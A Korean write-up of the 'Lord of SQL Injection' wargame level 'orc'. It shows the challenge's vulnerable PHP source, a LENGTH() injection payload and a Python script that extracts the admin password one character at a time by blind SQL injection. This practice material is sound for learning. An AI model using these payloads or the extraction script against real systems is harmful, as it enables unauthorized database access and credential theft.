# Lord of SQL Injection No.4 - orc

## 문제 출제의도

Blind SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello admin</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
    highlight_file(__FILE__); 
?>
```
* preg_match 로 "prob","_",".","()"를 걸러낸다.

* GET 메소드로 입력한 pw가 직접 쿼리에 들어간다.

* id의 값이 0을 제외한 모든 값이 즉, 참으로 판단되는 모든것들은 모두 Hello admin을 출력

* 쿼리의 pw값과 데이터베이스의 pw가 일치하면 해결되는 문제이다.

### addslashes
addslashed함수는 DB 상에서 쓰이는 ', ", \, NULL 같은 질의 문자들의 앞에 \를 붙힌 문자열을 반환한다.

데이터베이스에서 질의용이 아닌 데이터를 사용할때 질의 문자가 사용되면 일반 문자로 표현하기 위해 \를 붙힐때 자주 사용

## 문제 해결방안
* LENGTH함수를 이용하여 pw의 길이를 확인한다.
…?pw =' or id='admin' and LENGTH(pw)=8 -- -을 하게 되면 pw의 길이가 8자가 맞기 때문에 참을 의미하므로 Hello admin이라는 결과를 출력하게 된다.

* substr을 이용하여 pw를 추출한다. (주의 할점은 or문 뒤에 id='admin'을 꼭해주어야 한다. 그렇지 않다면 다른 계정의 pw를 받아오기 때문이다.)

* 이를 python 3.x코드로 풀이하였다.
```python
    import http.client
    result=''
    leng=8 # 원래는 0이여야 하지만 pw의 문자열길이가 8임을 알았기에 8
    header={'Cookie':' '} #로그인에 이용할 쿠키값
    string="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-=+" #pw가 될수있는 값들
    '''
    for i in range(1,100) :
        length='/orc_47190a4d33f675a601f8def32df2583a.php?pw=%27%20or%20length(pw)='+str(i)+' and%20id=%27admin'
        conn=http.client.HTTPConnection('los.eagle-jump.org')
        conn.request('GET',length,'',header)
        data=conn.getresponse().read()
        if "Hello admin" in data.decode():
            leng = i
            print ("pw length: "+str(i))
            break
            length의 길이를 구하는 for문인데 이미 LENGTH함수로 구했기 떄문에 패스함
    '''
    for i in range(1,leng+1): # 각 pw의 한자한자를 찾는 for문
        for j in range(0,76): # pw가 될수있는 값들
            substr='/orc_47190a4d33f675a601f8def32df2583a.php?pw=%27%20or%20substr(pw,'+ str(i) +',1)='+'%27'+ str(string[j]) +'%27'+'and%20id=%27admin' #반복하며 서브스트링을 만들어줌
            conn=http.client.HTTPConnection('los.eagle-jump.org') # 보안서버와 통신을 하기위해 사용하는 클래스
            conn.request('GET',substr,'',header) # 연결 성공시 인스턴스 리턴
            data=conn.getresponse().read()
            if 'Hello admin' in data.decode():
                result=result+string[j] # pw값을 만들어줌
                print ('substr(pw,'+str(i)+',1)= '+str(string[j])) # pw값을 하나 출력
                break
    print ('Password is '+result) #pw결괏값 출력
```
를 하면 결괏값이 나오게된다.